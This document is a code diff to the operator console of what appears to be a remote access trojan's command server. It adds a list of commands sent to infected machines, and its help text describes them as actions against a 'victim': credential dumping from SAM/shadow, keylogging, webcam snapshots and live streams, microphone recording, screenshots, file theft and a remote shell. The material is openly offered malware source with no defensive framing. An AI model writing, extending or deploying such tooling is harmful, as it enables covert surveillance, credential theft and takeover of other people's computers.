@@ -1,6 +1,21 @@
 from typing import Optional
 from .logger import logger
 
+REMOTE_COMMANDS = {
+    "help",
+    "download",
+    "upload",
+    "shell",
+    "ipconfig",
+    "screenshot",
+    "search",
+    "hashdump",
+    "keylogger",
+    "webcam_snapshot",
+    "webcam_stream",
+    "record_audio"
+}
+
 def handle_command(command: str, client_manager):
     parts = command.strip().split()
 
@@ -51,11 +66,10 @@ def interact_with_client(client_id: str, client_manager):
     client = client_manager.get(client_id)
 
     if not client:
-        logger.warning("[!] Client not found.")
+        logger.warning("Client not found.")
         return
 
-    logger.info(f"[+] Interacting with client {client.id} ({client.addr[0]})")
-    logger.info("Type 'back' to return.\n")
+    logger.info(f"Session started with {client.id} ({client.addr[0]})")
 
     while True:
         try:
@@ -64,34 +78,48 @@ def interact_with_client(client_id: str, client_manager):
             if not cmd:
                 continue
 
-            if cmd.lower() == "back":
+            # ------ LOCAL COMMANDS ------- #
+            if cmd == "back":
+                logger.info("Leaving session...")
                 break
 
-            elif cmd.lower() == "help":
+            if cmd == "help":
                 session_help()
+                continue
 
-            elif cmd.lower() == "info":
-                print_client_info(client)
+            if cmd == "disconnect":
+                client.send("__DISCONNECT__")
+                client.close()
+                client_manager.remove(client.id)
+                logger.warning("Client disconnected")
+                break
 
-            elif cmd.startswith("upload"):
-                handle_upload(cmd, client)
+            # --------- VALIDATE REMOTE COMMAND ---------#
+            base_cmd = cmd.split()[0]
 
-            elif cmd.startswith("download"):
-                handle_download(cmd, client)
+            if base_cmd not in REMOTE_COMMANDS:
+                logger.warning("Unknown command")
+                continue
 
+            # --------- SEND TO CLIENT --------#
+            client.send(cmd)
+
+            response = client.receive()
+
+            if response:
+                logger.info(response)
             else:
-                send_command_to_client(cmd, client)
+                logger.warning("No response")
 
         except KeyboardInterrupt:
-            logger.warning("Use 'back' to exit session.")
+            logger.warning("Use 'back' to exit session")
 
         except Exception as e:
-            logger.exception(f"Interact error: {e}")
+            logger.exception(f"Session error: {e}")
             break
 
 
 #---------- SESSION COMMANDS ---------#
-
 def send_command_to_client(command: str, client):
     try:
         client.send(command)
@@ -153,7 +181,6 @@ def handle_download(command: str, client):
 
 
 #----------- HELPERS --------------#
-
 def show_help():
     logger.debug("""
 Server commands:
@@ -165,12 +192,22 @@ Server commands:
 
 
 def session_help():
-    logger.debug("""
-Session commands:
-    info                        Show client info
-    upload <local> <remote>     Upload file
-    download <remote> <local>   Download file
-    back                        Return to main menu
+    logger.info("""
+Available commands:
 
-Any other command will be executed on the client.
+help               Show this help
+back               Exit session
+disconnect         Disconnect client
+
+download           Get file from victim
+upload             Send file to victim
+shell              Open remote shell
+ipconfig           Network configuration
+screenshot         Capture screen
+search             Find file on system
+hashdump           Dump credentials (SAM/shadow)
+keylogger          Start keylogging
+webcam_snapshot    Take webcam photo
+webcam_stream      Live webcam feed
+record_audio       Record microphone
 """)
